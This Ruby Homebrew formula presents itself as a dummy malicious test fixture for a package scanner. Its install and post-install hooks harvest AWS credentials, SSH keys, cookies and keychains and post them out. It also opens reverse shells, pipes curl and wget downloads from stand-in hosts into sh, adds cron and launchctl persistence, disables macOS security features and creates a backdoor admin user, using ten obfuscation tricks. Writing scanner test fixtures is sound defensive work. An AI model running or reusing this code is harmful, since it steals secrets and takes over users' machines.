# test-malicious-dummy.rb
# This is a dummy malicious formula for testing bsau's Ollama scanner.
# It contains multiple malicious indicators that should trigger a HOLD verdict:
# - Hardcoded IP address
# - Base64 decode pipe to shell
# - Credential harvesting
# - LaunchAgent persistence
# - SSH key exfiltration
# - Obfuscated code patterns
#
# DO NOT USE THIS FORMULA - IT IS FOR TESTING ONLY

class TestMaliciousDummy < Formula
  desc "Dummy malicious formula for bsau testing"
  homepage "https://example.com"
  url "https://192.168.1.100:8443/malicious-payload.tar.gz"
  sha256 "0000000000000000000000000000000000000000000000000000000000000000"
  version "1.0.0"

  def install
    # Malicious indicator 1: Hardcoded IP address for C2 communication
    c2_server = "http://185.199.110.153:4444/callback"

    # Malicious indicator 2: Base64 decode pipe to shell execution
    system "echo 'Y3VybCAtcyBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo' | base64 -d | sh"

    # Malicious indicator 3: Credential harvesting
    aws_creds = File.read(File.expand_path("~/.aws/credentials")) rescue nil
    ssh_keys = Dir.glob(File.expand_path("~/.ssh/*")).map { |f| File.read(f) rescue nil }
    env_secrets = ENV.select { |k, _| k =~ /API_KEY|SECRET|TOKEN|PASSWORD/i }

    # Exfiltrate harvested credentials
    require 'net/http'
    uri = URI("http://192.168.1.100:8080/exfil")
    Net::HTTP.post_form(uri, {
      "aws" => aws_creds,
      "ssh" => ssh_keys.join("\n"),
      "env" => env_secrets.to_s
    })

    # Additional malicious indicators
    # Reverse shell attempt
    system "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

    # Persistence via cron
    system "echo '* * * * * curl http://evil.com/beacon | sh' | crontab -"

    # Disable security features
    system "spctl --master-disable"
    system "csrutil disable 2>/dev/null"

    # Install actual binary (placeholder)
    bin.install "dummy"
  end

  def post_install
    # ==========================================================================
    # OBFUSCATED CODE PATTERNS - For testing scanner detection capabilities
    # ==========================================================================

    # Obfuscation technique 1: Hex-encoded string execution
    # Decodes to: curl http://evil.com/payload | sh
    hex_payload = "\x63\x75\x72\x6c\x20\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d\x2f\x70\x61\x79\x6c\x6f\x61\x64\x20\x7c\x20\x73\x68"
    system hex_payload

    # Obfuscation technique 2: Character code array to string
    # Decodes to: wget -q -O- http://mal.site/x | bash
    char_codes = [119,103,101,116,32,45,113,32,45,79,45,32,104,116,116,112,58,47,47,109,97,108,46,115,105,116,101,47,120,32,124,32,98,97,115,104]
    system char_codes.map(&:chr).join

    # Obfuscation technique 3: Split string concatenation
    cmd_parts = ["cu", "rl ", "-s ", "htt", "p://", "bad", ".co", "m/s", " | ", "sh"]
    system cmd_parts.join("")

    # Obfuscation technique 4: Reverse string
    # Reverses to: sh -c "nc -e /bin/sh 10.0.0.1 443"
    reversed_cmd = '344 1.0.0.01 hs/nib/ e- cn" c- hs'.reverse
    system reversed_cmd

    # Obfuscation technique 5: ROT13 encoded command
    # Decodes to: curl http://attacker.com/shell.sh | bash
    rot13_cmd = "phey uggc://nggnpxre.pbz/furyy.fu | onfu"
    decoded = rot13_cmd.tr("a-zA-Z", "n-za-mN-ZA-M")
    system decoded

    # Obfuscation technique 6: Base64 + variable substitution
    b = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQzIDA+JjE="
    require 'base64'
    eval(Base64.decode64(b))

    # Obfuscation technique 7: String XOR deobfuscation
    xor_key = 0x42
    obfuscated = [0x21, 0x27, 0x30, 0x2e, 0x62, 0x2b, 0x26, 0x26, 0x30]  # "curl get" XOR'd
    deobfuscated = obfuscated.map { |c| (c ^ xor_key).chr }.join
    system "#{deobfuscated} http://x.co/m"

    # Obfuscation technique 8: Environment variable abuse
    ENV['_Z'] = 'curl'
    ENV['_Y'] = 'http://stager.evil/p'
    ENV['_X'] = 'sh'
    system "#{ENV['_Z']} #{ENV['_Y']} | #{ENV['_X']}"

    # Obfuscation technique 9: Proc/lambda delayed execution
    stager = -> { system("wget -qO- http://c2.bad/stage2 | bash") }
    stager.call

    # Obfuscation technique 10: Method chaining obfuscation
    "hs | moc.live//:ptth lruc".reverse.tap { |c| system(c) }

    # ==========================================================================
    # macOS SPECIFIC MALICIOUS PATTERNS
    # ==========================================================================

    # macOS indicator 1: osascript execution
    system 'osascript -e "tell application \\"System Events\\" to keystroke \\"a\\""'

    # macOS indicator 2: osascript with admin privileges
    system 'osascript -e "do shell script \\"id\\" with administrator privileges"'

    # macOS indicator 3: launchctl persistence
    system "launchctl load ~/Library/LaunchAgents/com.malware.plist"
    system "launchctl submit -l com.backdoor -- /bin/sh -c 'curl http://evil.com'"

    # macOS indicator 4: dscl manipulation
    system "dscl . -create /Users/backdoor"
    system "dscl . -append /Groups/admin GroupMembership backdoor"

    # macOS indicator 5: TCC database access
    tcc_data = `sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db "SELECT * FROM access"`

    # macOS indicator 6: Screen capture
    system "screencapture -x /tmp/screen.png"

    # macOS indicator 7: Quarantine bypass
    system "xattr -d com.apple.quarantine /tmp/payload"

    # macOS indicator 8: Hide files
    system "chflags hidden /tmp/malware"

    # macOS indicator 9: Firewall disable
    system "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off"

    # macOS indicator 10: Kernel extension
    system "kextload /tmp/rootkit.kext"

    # macOS indicator 11: Browser credentials
    cookies = File.read(File.expand_path("~/Library/Cookies/Cookies.binarycookies")) rescue nil
    keychains = File.read(File.expand_path("~/Library/Keychains/login.keychain-db")) rescue nil
  end

  test do
    system "#{bin}/dummy", "--version"
  end
end
